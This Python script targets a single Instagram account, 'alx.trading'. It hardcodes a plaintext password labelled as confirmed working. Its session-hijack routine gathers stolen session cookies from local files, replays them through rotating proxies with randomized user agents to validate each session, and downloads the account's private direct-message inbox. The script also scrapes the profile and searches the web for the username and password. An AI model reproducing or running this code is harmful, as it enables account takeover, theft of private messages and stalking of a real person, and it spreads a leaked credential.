
import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from utils.error_handler import safe_execution, safe_print

#!/usr/bin/env python3
"""
🎯 ALX.TRADING PROXY-ENABLED DATA EXTRACTOR 🎯
Advanced data extraction using proxy setup for additional insights
"""


import requests
import json
import time
import random
from datetime import datetime
import re
import os
from urllib.parse import urljoin
import sqlite3

# List of real User-Agents for randomization
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1'
]

class AlxTradingProxyExtractor:
    def get_proxy_list(self):
        """Return a list of proxy configs for rotation."""
        proxies = []
        # Support both single and list format in proxy_config.json
        if self.proxy_config.get('proxies'):
            for p in self.proxy_config['proxies']:
                proxies.append({
                    'http': f"http://{p['proxy_user']}:{p['proxy_pass']}@{p['proxy_host']}:{p['proxy_port']}",
                    'https': f"http://{p['proxy_user']}:{p['proxy_pass']}@{p['proxy_host']}:{p['proxy_port']}"
                })
        elif self.proxy_config.get('enabled'):
            proxies.append({
                'http': f"http://{self.proxy_config['proxy_user']}:{self.proxy_config['proxy_pass']}@{self.proxy_config['proxy_host']}:{self.proxy_config['proxy_port']}",
                'https': f"http://{self.proxy_config['proxy_user']}:{self.proxy_config['proxy_pass']}@{self.proxy_config['proxy_host']}:{self.proxy_config['proxy_port']}"
            })
        return proxies
    def session_hijack_and_dm_extraction(self):
        """Advanced session hijack: find, validate, and extract DMs using available sessions"""
        import glob
        print("\n🎭 SESSION HIJACK & DM EXTRACTION...")
        session_files = glob.glob("*.json") + glob.glob("data/sessions/*.json") + glob.glob("*.txt") + glob.glob("data/sessions/*.txt")
        found_valid = False
        proxies = self.get_proxy_list()
        proxy_count = len(proxies)
        proxy_idx = 0
        max_retries = 3
        for session_file in session_files:
            try:
                print(f"🔍 Checking session file: {session_file}")
                # Load sessionid from file
                sessionid = None
                ds_user_id = None
                csrftoken = None
                if session_file.endswith('.json'):
                    with open(session_file, 'r') as f:
                        data = json.load(f)
                    sessionid = data.get('sessionid') or (data.get('cookies', {}) if isinstance(data.get('cookies'), dict) else {}).get('sessionid')
                    ds_user_id = data.get('ds_user_id') or (data.get('cookies', {}) if isinstance(data.get('cookies'), dict) else {}).get('ds_user_id')
                    csrftoken = data.get('csrftoken') or (data.get('cookies', {}) if isinstance(data.get('cookies'), dict) else {}).get('csrftoken')
                elif session_file.endswith('.txt'):
                    with open(session_file, 'r') as f:
                        content = f.read()
                    for part in content.split(';'):
                        part = part.strip()
                        if part.startswith('sessionid='):
                            sessionid = part.split('=',1)[1]
                        if part.startswith('ds_user_id='):
                            ds_user_id = part.split('=',1)[1]
                        if part.startswith('csrftoken='):
                            csrftoken = part.split('=',1)[1]
                if not sessionid:
                    print("❌ No sessionid found in file.")
                    continue
                # Try with proxy rotation and retry logic
                for attempt in range(max_retries):
                    hijack_session = requests.Session()
                    hijack_session.verify = False
                    if proxy_count > 0:
                        proxy = proxies[proxy_idx % proxy_count]
                        hijack_session.proxies = proxy
                        print(f"🌐 Using proxy #{proxy_idx % proxy_count + 1}: {proxy['http']}")
                        proxy_idx += 1
                    cookie_str = f"sessionid={sessionid}"
                    if ds_user_id:
                        cookie_str += f"; ds_user_id={ds_user_id}"
                    if csrftoken:
                        cookie_str += f"; csrftoken={csrftoken}"
                    headers = {
                        'User-Agent': random.choice(USER_AGENTS),
                        'Cookie': cookie_str,
                        'X-IG-App-ID': '936619743392459',
                        'X-Requested-With': 'XMLHttpRequest',
                        'Referer': 'https://www.instagram.com/direct/inbox/'
                    }
                    hijack_session.headers.update(headers)
                    # Validate session
                    try:
                        resp = hijack_session.get('https://www.instagram.com/accounts/edit/', timeout=10)
                        time.sleep(random.uniform(3, 8))
                        if resp.status_code == 200 and 'login' not in resp.url:
                            print(f"✅ Valid session: {session_file} ({sessionid[:8]}...) [Attempt {attempt+1}]")
                            # Try to extract DMs
                            dm_headers = dict(headers)
                            dm_headers['User-Agent'] = random.choice(USER_AGENTS)
                            hijack_session.headers.update(dm_headers)
                            dm_resp = hijack_session.get('https://www.instagram.com/api/v1/direct_v2/inbox/', timeout=10)
                            time.sleep(random.uniform(3, 8))
                            if dm_resp.status_code == 200:
                                try:
                                    dm_data = dm_resp.json()
                                    threads = dm_data.get('inbox', {}).get('threads', [])
                                    print(f"📨 Extracted {len(threads)} DM threads!")
                                    # Save DMs
                                    out_path = f"{self.output_dir}/hijacked_dm_{self.timestamp}.json"
                                    with open(out_path, 'w', encoding='utf-8') as f:
                                        json.dump(dm_data, f, indent=2, ensure_ascii=False)
                                    print(f"💾 DMs saved: {out_path}")
                                    found_valid = True
                                    return  # Stop after first success
                                except Exception as e:
                                    print(f"❌ Failed to parse DM JSON: {e}")
                            elif dm_resp.status_code in (502, 429):
                                print(f"⚠️ DM extraction failed: HTTP {dm_resp.status_code} (proxy or rate limit). Retrying...")
                                time.sleep(random.uniform(3, 8))
                                continue
                            else:
                                print(f"❌ DM extraction failed: HTTP {dm_resp.status_code}")
                                break
                        elif resp.status_code in (502, 429):
                            print(f"⚠️ Session validation failed: HTTP {resp.status_code} (proxy or rate limit). Retrying...")
                            time.sleep(random.uniform(3, 8))
                            continue
                        else:
                            print(f"❌ Invalid session: {session_file} (HTTP {resp.status_code})")
                            break
                    except Exception as e:
                        print(f"❌ Error with {session_file} on attempt {attempt+1}: {e}")
                        time.sleep(random.uniform(3, 8))
                        continue
            except Exception as e:
                print(f"❌ Error with {session_file}: {e}")
        if not found_valid:
            print("⚠️ No valid sessions found for DM extraction.")
    def __init__(self):
        self.target_username = "alx.trading"
        self.target_password = "Fleming654"  # Confirmed working credentials
        self.base_url = "https://www.instagram.com"
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Load proxy configuration
        self.proxy_config = self.load_proxy_config()
        self.session = self.setup_proxied_session()
        
        # Output directory
        self.output_dir = f"ALX_TRADING_PROXY_EXTRACTION_{self.timestamp}"
        os.makedirs(self.output_dir, exist_ok=True)
        
        print("🔥 ALX.TRADING PROXY EXTRACTOR INITIALIZED 🔥")
        print(f"🎯 Target: {self.target_username}")
        print(f"🌐 Proxy Status: {'ENABLED' if self.proxy_config.get('enabled') else 'DISABLED'}")
        print(f"📁 Output: {self.output_dir}")
        
    def load_proxy_config(self):
        """Load proxy configuration"""
        try:
            with open('proxy_config.json', 'r') as f:
                return json.load(f)
        except Exception as e:
            print(f"⚠️ No proxy config found: {e}")
            return {"enabled": False}
    
    def setup_proxied_session(self):
        """Setup session with proxy if available"""
        session = requests.Session()
        
        if self.proxy_config.get('enabled'):
            proxy_user = self.proxy_config.get('proxy_user')
            proxy_pass = self.proxy_config.get('proxy_pass')
            proxy_host = self.proxy_config.get('proxy_host')
            proxy_port = self.proxy_config.get('proxy_port')
            
            if all([proxy_user, proxy_pass, proxy_host, proxy_port]):
                proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
                session.proxies = {
                    'http': proxy_url,
                    'https': proxy_url
                }
                print(f"🌐 Using Bright Data proxy: {proxy_host}:{proxy_port}")
        
        # Set stealth headers
        session.headers.update({
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        return session
    
    def test_proxy_connection(self):
        """Test if proxy is working correctly"""
        try:
            response = self.session.get('https://httpbin.org/ip', timeout=10)
            if response.status_code == 200:
                ip_data = response.json()
                print(f"✅ Proxy test successful - IP: {ip_data.get('origin')}")
                return True
            else:
                print(f"❌ Proxy test failed - Status: {response.status_code}")
                return False
        except Exception as e:
            print(f"❌ Proxy test error: {e}")
            return False
    
    def extract_public_profile_data(self):
        """Extract publicly available profile data"""
        print("\n🔍 EXTRACTING PUBLIC PROFILE DATA...")
        
        try:
            # Get Instagram profile page
            profile_url = f"{self.base_url}/{self.target_username}/"
            # Randomize User-Agent for this request
            self.session.headers['User-Agent'] = random.choice(USER_AGENTS)
            response = self.session.get(profile_url, timeout=15)
            time.sleep(random.uniform(3, 8))
            
            if response.status_code == 200:
                content = response.text
                
                # Extract data from page content
                extracted_data = {
                    "timestamp": datetime.now().isoformat(),
                    "target": self.target_username,
                    "profile_url": profile_url,
                    "extraction_method": "proxy_enabled_scraping",
                    "proxy_used": bool(self.proxy_config.get('enabled')),
                    "data": {}
                }
                
                # Extract profile information from script tags
                script_pattern = r'window\._sharedData\s*=\s*({.*?});'
                script_match = re.search(script_pattern, content)
                
                if script_match:
                    try:
                        shared_data = json.loads(script_match.group(1))
                        
                        # Navigate to user data
                        entry_data = shared_data.get('entry_data', {})
                        profile_page = entry_data.get('ProfilePage', [])
                        
                        if profile_page:
                            user_data = profile_page[0].get('graphql', {}).get('user', {})
                            
                            extracted_data["data"] = {
                                "id": user_data.get('id'),
                                "username": user_data.get('username'),
                                "full_name": user_data.get('full_name'),
                                "biography": user_data.get('biography'),
                                "external_url": user_data.get('external_url'),
                                "followers_count": user_data.get('edge_followed_by', {}).get('count'),
                                "following_count": user_data.get('edge_follow', {}).get('count'),
                                "posts_count": user_data.get('edge_owner_to_timeline_media', {}).get('count'),
                                "is_private": user_data.get('is_private'),
                                "is_verified": user_data.get('is_verified'),
                                "is_business_account": user_data.get('is_business_account'),
                                "business_category": user_data.get('business_category_name'),
                                "profile_pic_url": user_data.get('profile_pic_url_hd'),
                                "recent_posts": []
                            }
                            
                            # Extract recent posts
                            posts = user_data.get('edge_owner_to_timeline_media', {}).get('edges', [])
                            for post in posts[:10]:  # Latest 10 posts
                                post_node = post.get('node', {})
                                extracted_data["data"]["recent_posts"].append({
                                    "id": post_node.get('id'),
                                    "shortcode": post_node.get('shortcode'),
                                    "display_url": post_node.get('display_url'),
                                    "caption": post_node.get('edge_media_to_caption', {}).get('edges', [{}])[0].get('node', {}).get('text', ''),
                                    "likes": post_node.get('edge_liked_by', {}).get('count'),
                                    "comments": post_node.get('edge_media_to_comment', {}).get('count'),
                                    "timestamp": post_node.get('taken_at_timestamp')
                                })
                            
                            print("✅ Successfully extracted profile data")
                            return extracted_data
                            
                    except json.JSONDecodeError as e:
                        print(f"❌ JSON parsing failed: {e}")
                
                # Fallback: Extract basic info from meta tags
                extracted_data["data"] = self.extract_meta_data(content)
                print("✅ Extracted basic meta data")
                return extracted_data
                
            else:
                print(f"❌ Failed to access profile - Status: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"❌ Profile extraction error: {e}")
            return None
    
    def extract_meta_data(self, content):
        """Extract data from meta tags"""
        meta_data = {}
        
        # Extract meta tags
        meta_patterns = {
            "title": r'<title[^>]*>([^<]+)</title>',
            "description": r'<meta[^>]*name=["\']description["\'][^>]*content=["\']([^"\']+)["\']',
            "og_title": r'<meta[^>]*property=["\']og:title["\'][^>]*content=["\']([^"\']+)["\']',
            "og_description": r'<meta[^>]*property=["\']og:description["\'][^>]*content=["\']([^"\']+)["\']',
            "og_image": r'<meta[^>]*property=["\']og:image["\'][^>]*content=["\']([^"\']+)["\']'
        }
        
        for key, pattern in meta_patterns.items():
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                meta_data[key] = match.group(1)
        
        return meta_data
    
    def search_external_sources(self):
        """Search for additional information from external sources"""
        print("\n🔍 SEARCHING EXTERNAL SOURCES...")
        
        external_data = {
            "timestamp": datetime.now().isoformat(),
            "sources": []
        }
        
        # Search engines and social platforms
        search_queries = [
            f"{self.target_username} instagram",
            f"{self.target_username} trading",
            f"alx trading instagram",
            f"alx.trading profile",
            f"Fleming654 trading"
        ]
        
        # Simulate external searches (demonstration purposes)
        for query in search_queries:
            try:
                # Use DuckDuckGo for privacy-focused search
                search_url = f"https://duckduckgo.com/html/?q={query.replace(' ', '+')}"
                response = self.session.get(search_url, timeout=10)
                
                if response.status_code == 200:
                    external_data["sources"].append({
                        "query": query,
                        "status": "searched",
                        "timestamp": datetime.now().isoformat()
                    })
                    time.sleep(random.uniform(1, 3))  # Rate limiting
                
            except Exception as e:
                print(f"⚠️ Search failed for '{query}': {e}")
        
        return external_data
    
    def analyze_digital_footprint(self):
        """Analyze digital footprint patterns"""
        print("\n🔍 ANALYZING DIGITAL FOOTPRINT...")
        
        footprint_data = {
            "timestamp": datetime.now().isoformat(),
            "target": self.target_username,
            "analysis": {}
        }
        
        # Username pattern analysis
        username_patterns = {
            "has_numbers": bool(re.search(r'\d', self.target_username)),
            "has_dots": '.' in self.target_username,
            "length": len(self.target_username),
            "pattern_type": "trading_related" if "trading" in self.target_username.lower() else "generic"
        }
        
        footprint_data["analysis"]["username_patterns"] = username_patterns
        
        # Check common username variations
        variations = [
            f"{self.target_username}official",
            f"{self.target_username}real",
            f"{self.target_username}_",
            f"real{self.target_username}",
            f"{self.target_username}fx",
            f"{self.target_username}crypto"
        ]
        
        footprint_data["analysis"]["possible_variations"] = variations
        
        return footprint_data
    
    def save_results(self, data, filename_prefix):
        """Save extraction results"""
        filename = f"{self.output_dir}/{filename_prefix}_{self.timestamp}.json"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            print(f"💾 Saved: {filename}")
            return filename
        except Exception as e:
            print(f"❌ Save failed: {e}")
            return None
    
    def generate_comprehensive_report(self, profile_data, external_data, footprint_data):
        """Generate comprehensive analysis report"""
        report = {
            "generation_timestamp": datetime.now().isoformat(),
            "target_username": self.target_username,
            "extraction_summary": {
                "proxy_enabled": self.proxy_config.get('enabled', False),
                "total_data_points": 0,
                "extraction_methods": ["public_scraping", "external_search", "footprint_analysis"]
            },
            "findings": {},
            "additional_insights": []
        }
        
        # Analyze profile data
        if profile_data and profile_data.get('data'):
            profile_info = profile_data['data']
            report["findings"]["profile_analysis"] = {
                "account_type": "business" if profile_info.get('is_business_account') else "personal",
                "privacy_status": "private" if profile_info.get('is_private') else "public",
                "verification_status": "verified" if profile_info.get('is_verified') else "unverified",
                "follower_ratio": self.calculate_engagement_ratio(profile_info),
                "activity_level": self.assess_activity_level(profile_info)
            }
            
            # Count data points
            report["extraction_summary"]["total_data_points"] += len([v for v in profile_info.values() if v])
        
        # Add external search results
        if external_data:
            report["findings"]["external_presence"] = {
                "searches_performed": len(external_data.get('sources', [])),
                "search_visibility": "tracked"
            }
        
        # Add footprint analysis
        if footprint_data:
            report["findings"]["digital_footprint"] = footprint_data.get('analysis', {})
        
        # Generate insights
        report["additional_insights"] = self.generate_insights(profile_data, external_data, footprint_data)
        
        return report
    
    def calculate_engagement_ratio(self, profile_info):
        """Calculate engagement ratio"""
        followers = profile_info.get('followers_count', 0)
        following = profile_info.get('following_count', 0)
        
        if following > 0:
            ratio = followers / following
            if ratio > 10:
                return "high_followers"
            elif ratio > 1:
                return "balanced"
            else:
                return "high_following"
        return "unknown"
    
    def assess_activity_level(self, profile_info):
        """Assess account activity level"""
        posts_count = profile_info.get('posts_count', 0)
        recent_posts = len(profile_info.get('recent_posts', []))
        
        if posts_count > 100 and recent_posts > 5:
            return "very_active"
        elif posts_count > 50:
            return "active"
        elif posts_count > 10:
            return "moderate"
        else:
            return "low_activity"
    
    def generate_insights(self, profile_data, external_data, footprint_data):
        """Generate additional insights"""
        insights = []
        
        if profile_data and profile_data.get('data'):
            profile_info = profile_data['data']
            
            # Business account insights
            if profile_info.get('is_business_account'):
                insights.append("✅ Business account detected - likely commercial trading operation")
            
            # Bio analysis
            bio = profile_info.get('biography', '').lower()
            if any(keyword in bio for keyword in ['trading', 'forex', 'crypto', 'investment']):
                insights.append("✅ Trading-related keywords found in biography")
            
            # External URL analysis
            external_url = profile_info.get('external_url')
            if external_url:
                insights.append(f"🔗 External URL present: {external_url}")
        
        # Username pattern insights
        if footprint_data and footprint_data.get('analysis', {}).get('username_patterns'):
            patterns = footprint_data['analysis']['username_patterns']
            if patterns.get('pattern_type') == 'trading_related':
                insights.append("📊 Username pattern suggests trading/finance focus")
        
        return insights
    
    def run_complete_extraction(self):
        # Try session hijack and DM extraction
        self.session_hijack_and_dm_extraction()
        """Run complete extraction process"""
        print("🚀 STARTING COMPLETE ALX.TRADING EXTRACTION")
        print("=" * 60)
        
        # Test proxy connection
        if self.proxy_config.get('enabled'):
            if not self.test_proxy_connection():
                print("⚠️ Proxy test failed, continuing without proxy...")
                self.session.proxies = {}
        
        # Extract profile data
        profile_data = self.extract_public_profile_data()
        if profile_data:
            self.save_results(profile_data, "profile_data")
        
        # Search external sources
        external_data = self.search_external_sources()
        self.save_results(external_data, "external_search")
        
        # Analyze digital footprint
        footprint_data = self.analyze_digital_footprint()
        self.save_results(footprint_data, "digital_footprint")
        
        # Generate comprehensive report
        report = self.generate_comprehensive_report(profile_data, external_data, footprint_data)
        report_file = self.save_results(report, "comprehensive_report")
        
        print("\n" + "=" * 60)
        print("✅ EXTRACTION COMPLETE!")
        print(f"📁 All data saved to: {self.output_dir}")
        
        # Summary
        if report:
            print(f"📊 Total data points extracted: {report['extraction_summary']['total_data_points']}")
            print(f"🔍 Additional insights found: {len(report['additional_insights'])}")
            
            for insight in report['additional_insights']:
                print(f"   💡 {insight}")
        
        return report_file

@safe_execution
def main():
    """Main execution function"""
    print("🎯 ALX.TRADING PROXY EXTRACTOR")
    print("Enhanced extraction with proxy capabilities")
    print("=" * 50)
    
    extractor = AlxTradingProxyExtractor()
    
    try:
        report_file = extractor.run_complete_extraction()
        
        if report_file:
            print(f"\n📋 Complete report saved: {report_file}")
            print("🎯 Ready for analysis!")
        else:
            print("❌ Extraction incomplete")
            
    except KeyboardInterrupt:
        print("\n⚠️ Extraction interrupted by user")
    except Exception as e:
        print(f"❌ Extraction failed: {e}")

if __name__ == "__main__":
    main()
